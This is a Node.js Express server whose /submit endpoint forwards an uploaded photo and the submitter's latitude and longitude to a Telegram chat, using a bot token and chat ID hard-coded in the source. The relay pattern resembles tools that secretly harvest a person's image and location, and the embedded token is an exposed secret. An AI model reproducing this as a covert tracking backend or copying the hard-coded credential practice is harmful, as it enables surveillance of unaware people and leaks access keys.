const express = require("express");
const multer = require("multer");
const cors = require("cors");
const FormData = require("form-data");
const fetch = require("node-fetch"); // important

const app = express();
app.use(cors());

// multer memory storage
const upload = multer({ storage: multer.memoryStorage() });

// 🔴 HARD-CODED (as you requested)
const BOT_TOKEN = "8595589382:AAFBQLaKCq8FTfN8HYg2KB9iYhbL4sV6s4c";
const CHAT_ID = "8522367236";

app.get("/", (req, res) => {
  res.send("Backend alive");
});

app.post("/submit", upload.single("photo"), async (req, res) => {
  try {
    console.log("REQUEST HIT");
    console.log("FILE SIZE:", req.file?.size);

    if (!req.file) {
      return res.status(400).json({ error: "No photo received" });
    }

    const { latitude, longitude } = req.body;

    const form = new FormData();
    form.append("chat_id", CHAT_ID);
    form.append("photo", req.file.buffer, {
      filename: "photo.jpg",
      contentType: "image/jpeg"
    });

    if (latitude && longitude) {
      form.append(
        "caption",
        `📍 Location\nLat: ${latitude}\nLong: ${longitude}`
      );
    }

    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form,
      headers: form.getHeaders()
    });

    res.json({ success: true });
  } catch (err) {
    console.error("ERROR:", err);
    res.status(500).json({ error: "Telegram send failed" });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
